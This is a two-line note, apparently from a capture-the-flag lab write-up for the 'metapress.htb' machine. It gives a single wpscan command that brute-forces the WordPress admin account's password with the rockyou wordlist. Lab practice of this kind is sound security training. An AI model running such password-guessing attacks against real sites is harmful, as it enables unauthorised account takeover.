# scan password of admin user
wpscan -url http://metapress.htb/ -passwords /usr/share/wordlists/rockyou.txt -username admin -max-threads 50